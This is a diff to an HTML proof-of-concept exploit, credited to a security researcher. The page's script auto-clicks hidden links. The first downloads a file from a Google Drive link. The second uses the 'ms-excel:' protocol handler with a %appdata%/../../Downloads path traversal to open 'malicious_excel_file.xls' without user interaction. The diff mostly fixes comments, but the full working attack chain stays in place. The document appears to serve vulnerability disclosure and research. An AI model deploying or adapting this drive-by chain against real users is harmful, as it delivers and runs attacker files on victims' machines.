@@ -1,7 +1,7 @@
 <!-- 
 Process name: C:\Program Files (x86)\Microsoft Office\root\Office16\protocolhandler.exe
 
-Tested Windows variabless:
+Tested Windows variables:
 ms-excel:%LOCALAPPDATA%/../../Downloads/test.xls
 ms-excel:%appdata%/../../Downloads/test.xls
 
@@ -18,14 +18,15 @@ Credits: Sahar Shlichove - Security Researcher
 <body>
 <script>
 
-// Execute Edge browser and download file
+// Download the file
 
 (function(){
 	setTimeout(function() {
 		document.querySelector(".local-load1").click();
 	},1000);
 
-// After downloaded file, execute it by IE with out any user interaction.
+// After downloading the file, execute the Excel file.
+	
 	setTimeout(function(){
 		document.querySelector(".local-load2").click();
 	},5500);
@@ -34,7 +35,7 @@ Credits: Sahar Shlichove - Security Researcher
 </script>
 
 <div class="wrapper">
-	<a class="local-load1" href="microsoft-edge:https://drive.google.com/uc?export=download&id=1UoKlroaYN3lLr6E3-a-yE9oXMa584UMd"></a> <!-- Must be a Google Drive shared link because the Edge browser trust it and let you download it directly rather than displaying it as a spreadsheet. -->
+	<a class="local-load1" href="https://drive.google.com/uc?export=download&id=1UoKlroaYN3lLr6E3-a-yE9oXMa584UMd"></a> <!-- Must be a Google Drive shared link because the Edge browser trusts it and let you download it directly rather than displaying it as a spreadsheet. -->
 	<a class="local-load2" href="ms-excel:%appdata%/../../Downloads/malicious_excel_file.xls"></a> <!-- User local download path -->
 </div>
 
